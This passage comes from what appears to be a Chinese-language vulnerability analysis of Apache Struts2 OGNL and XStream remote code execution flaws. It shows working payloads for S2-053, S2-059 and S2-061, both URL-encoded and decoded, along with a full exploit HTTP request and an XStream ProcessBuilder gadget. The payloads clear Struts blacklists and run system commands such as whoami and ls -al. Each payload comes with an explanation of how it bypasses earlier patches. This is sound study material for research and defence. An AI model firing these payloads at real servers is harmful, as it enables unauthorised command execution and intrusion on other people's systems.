                    <opmode>0</opmode>
                    <serviceIterator class="javax.imageio.spi.FilterIterator">
                    <iter class="javax.imageio.spi.FilterIterator">
                        <iter class="java.util.Collections$EmptyIterator"/>
                        <next class="java.lang.ProcessBuilder">
                        <command>
                            <string>open</string>
                            <string>-a</string>
                            <string>Calculator</string>
                        </command>
                        <redirectErrorStream>false</redirectErrorStream>
                        </next>
                    </iter>
                    <filter class="javax.imageio.ImageIO$ContainsFilter">
                        <method>
                        <class>java.lang.ProcessBuilder</class>
                        <name>start</name>
                        <parameter-types/>
                        </method>
                        <name>foo</name>
                    </filter>
                    <next class="string">foo</next>
                    </serviceIterator>
                    <lock/>
                </cipher>
                <input class="java.lang.ProcessBuilder$NullInputStream"/>
                <ibuffer></ibuffer>
                <done>false</done>
                <ostart>0</ostart>
                <ofinish>0</ofinish>
                <closed>false</closed>
                </is>
                <consumed>false</consumed>
            </dataSource>
            <transferFlavors/>
            </dataHandler>
            <dataLen>0</dataLen>
        </value>
        </jdk.nashorn.internal.objects.NativeString>
        <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
    </entry>
    <entry>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    </entry>
</map>          
```

> 漏洞原理是XStream的反序列化,详情可参考[Xstream反序列化漏洞](https://www.anquanke.com/post/id/204314),就不再深入分析了.

## S2-053

```java
%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3D'whoami').(%23iswin%3D(%40java.lang.System%40getProperty('os.name').toLowerCase().contains('win'))).(%23cmds%3D(%23iswin%3F%7B'cmd.exe'%2C'%2Fc'%2C%23cmd%7D%3A%7B'%2Fbin%2Fbash'%2C'-c'%2C%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream()))%7D%0A
```

url解码后:

```java
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
```

> 可以看到这个payload和S2-045也是很类似的

> 可以看到payload中连接每个表达式的不再是','而变成了'.',是因为S2-029的补丁把ATSSequence树给禁了,而用','连接生成的AST树都是ATSSequence树,之所以使用'.'就是为了绕过S2-029的补丁.

> Struts2 2.3.30(2.5.2)之后的版本,之前payload使用的_memberAccess和DefaultMemberAccess都进入到黑名单中了,覆盖的方法看似就不行了.S2-045的payload提供了一种新的方法.通过container获取了OgnlUtil实例,再使用 clear方法清空excludedClasses、excludedPackageNames,然后setMemberAccess方法设置默认的memberAccess来覆盖_memberAccess.

> payload首先定义#fuck='multipart/form-data'是为了满足漏洞的触发条件,详情可见S2-045的漏洞分析文章.然后调用ognl.OgnlContext的DEFAULT_MEMBER_ACCESS属性来获取DefaultMemberAccess实例.然后利用一个三元表达式,可看到#_memberAccess初始为空所以执行:后面的内容.:后面的内容首先获取一个container的实例,然后调用这个实例的getExcludedPackageNames和getExcludedClasses的clear方法来清空黑名单,然后再设置setMemberAccess为DefaultMemberAccess实例.之后定义要执行的命令字符串,之后调用java.lang.System的getProperty方来判断操作系统类型,如果是windows操作系统,调用cmd.exe /c 来执行命令,如果不是windows系统,则使用/bin/bash -c 执行命令,接下里的输出执行命令结果的流程就和S2-001的输出命令执行结果的流程类似了.以这个#cmds参数构造了一个ProcessBuilder对象,然后设置ProcessBuilder对象的redirectErrorStream属性为true,然后调用start方法新建一个进程执行命令.之后在获取一个org.apache.struts2.ServletActionContext类的getResponse对象来获取输出流,用于处理response.然后以这个getResponse对象和#process为参数调用org.apache.commons.io.IOUtils的copy方法把执行命令的结果发送到缓冲区,最后输出缓冲区的内容.

## S2-059

```java
%{11*11}
```

```java
%{#_memberAccess.allowPrivateAccess=true,#_memberAccess.allowStaticMethodAccess=true,#_memberAccess.excludedClasses=#_memberAccess.acceptProperties,#_memberAccess.excludedPackageNamePatterns=#_memberAccess.acceptProperties,#res=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=@java.lang.Runtime@getRuntime(),#s=new java.util.Scanner(#a.exec('ls -al').getInputStream()).useDelimiter('\\\\A'),#str=#s.hasNext()?#s.next():'',#res.print(#str),#res.close()
}
```

> 由于OgnlContext的_memberAccess变量进行了访问控制限制,决定了用哪些类,哪些包,哪些方法可以被OGNL表达式所使用.所以其中poc中需要设置#_memberAccess.allowPrivateAccess=true用来授权访问private方法.

> 首先设置_memberAccess的allowStaticMethodAccess属性为true用来开启允许调用静态方法.然后设置_memberAccess的excludedClasses属性值为_memberAccess的acceptProperties属性值用来将受限的类名设置为空.继续设置_memberAccess的excludedPackageNamePatterns属性值为_memberAccess.acceptProperties的属性值用来将受限的包名设置为空.

> 剩下的流程就是调用org.apache.struts2.ServletActionContext的getResponse().getWriter()方法返回HttpServletResponse实例的respons对象.接下来是调用java.lang.Runtime类的getRuntime方法获取一个getRuntime对象,之后以ls -al为参数调用getRuntime的exec执行命令的字节流为参数新建一个java.util.Scanner类的对象,用来获取输入.由于Scanner对象将首先跳过输入流开头的所有空白分隔符,然后对输入流中的信息进行检查,直到遇到空白分隔符为止.所以为了获取完整的执行结果,需要重新设置输出字符串的分隔符,所以以\\\\\\\\A为参数调用Scanner对象的useDelimiter方法来指定输出字符串的分隔符.接下来是一个三元表达式,如果s.hasNext()有输入则把对象的s输入赋值给str,否则把空值给str,然后调用对象res的print输出str的值,然后关闭对象res.

## S2-061

```html
POST /s2_061_war_exploded/index.action;jsessionid=79E61355244F9B654BF1EDF344179E2A HTTP/1.1
Host: localhost:8080
Content-Length: 900
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="89", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: http://localhost:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8080/s2_061_war_exploded/index.action
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=79E61355244F9B654BF1EDF344179E2A
Connection: close

name=%25%7B%28%27Powered_by_Unicode_Potats0%2Cenjoy_it%27%29.%28%23UnicodeSec+%3D+%23application%5B%27org.apache.tomcat.InstanceManager%27%5D%29.%28%23potats0%3D%23UnicodeSec.newInstance%28%27org.apache.commons.collections.BeanMap%27%29%29.%28%23stackvalue%3D%23attr%5B%27struts.valueStack%27%5D%29.%28%23potats0.setBean%28%23stackvalue%29%29.%28%23context%3D%23potats0.get%28%27context%27%29%29.%28%23potats0.setBean%28%23context%29%29.%28%23sm%3D%23potats0.get%28%27memberAccess%27%29%29.%28%23emptySet%3D%23UnicodeSec.newInstance%28%27java.util.HashSet%27%29%29.%28%23potats0.setBean%28%23sm%29%29.%28%23potats0.put%28%27excludedClasses%27%2C%23emptySet%29%29.%28%23potats0.put%28%27excludedPackageNames%27%2C%23emptySet%29%29.%28%23exec%3D%23UnicodeSec.newInstance%28%27freemarker.template.utility.Execute%27%29%29.%28%23cmd%3D%7B%27whoami%27%7D%29.%28%23res%3D%23exec.exec%28%23cmd%29%29%7D&age=
```

url解码后为:

```java
name=%{('Powered_by_Unicode_Potats0,enjoy_it').(#UnicodeSec = #application['org.apache.tomcat.InstanceManager']).(#potats0=#UnicodeSec.newInstance('org.apache.commons.collections.BeanMap')).(#stackvalue=#attr['struts.valueStack']).(#potats0.setBean(#stackvalue)).(#context=#potats0.get('context')).(#potats0.setBean(#context)).(#sm=#potats0.get('memberAccess')).(#emptySet=#UnicodeSec.newInstance('java.util.HashSet')).(#potats0.setBean(#sm)).(#potats0.put('excludedClasses',#emptySet)).(#potats0.put('excludedPackageNames',#emptySet)).(#exec=#UnicodeSec.newInstance('freemarker.template.utility.Execute')).(#cmd={'whoami'}).(#res=#exec.exec(#cmd))}&age=
```

> 在 Struts2.5.20中,使用的ognl-3.1.21.jar包ognl.OgnlRuntime#getStaticField调用了isAccessible方法,同时OgnlUtil中set黑名单集合等修饰符由public变成了protected.在Struts2.5.22+中,ognl.OgnlRuntime#invokeMethod方法调用时屏蔽了常用的类,即便将黑名单绕过去了当方法调用时仍会判断是否是这些常用的类.同时struts-default.xml中定义的黑名单再次增加.相当于之前的payload所用的绕过方式都不能用了,比如使用@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS获得DefaultMemberAccess实例、使用#attr['struts.valueStack'].context获得上下文环境、通过容器创建实例等.

> org.apache.tomcat.InstanceManager是使用其默认实现类DefaultInstanceManager的newInstance方法来创建实例.

> org.apache.commons.collections.BeanMap是通过BeanMap#setBean方法将类实例存入BeanMap中,然后存入的同时进行初始化,将其set、get方法存入当前的writeMethod、readMethod集合中.通过BeanMap#get方法可以在当前bean的readMethod集合中找到对应get方法,再反射调用该方法返回一个对象.通过BeanMap#put方法可以在当前bean的writeMethod集合中找到对应set方法,再反射调用该方法.

> S2-061的payload又使用了新的方法,首先从application中获得DefaultInstanceManager实例,调用newInstance方法获得BeanMap实例.接着先将OgnlValueStack存入BeanMap中,通过get方法可以获得OgnlContext实例,获得OgnlContext实例就可以通过其获得MemberAccess实例,接着可以通过put方法调用set方法,将其黑名单置空,黑名单置空后就可以创建一个黑名单中的类实例来执行命令了.

## 参考

> https://www.cnblogs.com/mistor/p/6129682.html

> https://wooyun.js.org/drops/OGNL%E8%AE%BE%E8%AE%A1%E5%8F%8A%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93%E9%80%A0%E6%88%90%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html

> https://milkfr.github.io/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2019/04/02/analysis-struts2-ognl-rce-3/

> https://mp.weixin.qq.com/s/RSs7MxolwGhjtENfNx1oTg

> https://lucifaer.com/2019/01/16/%E6%B5%85%E6%9E%90OGNL%E7%9A%84%E6%94%BB%E9%98%B2%E5%8F%B2/#1-3-valueStack

> https://www.freebuf.com/vuls/217482.html

> http://j0k3r.top/2020/08/19/java-ognl/#0x04-%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E4%B8%8E%E9%98%B2%E5%BE%A1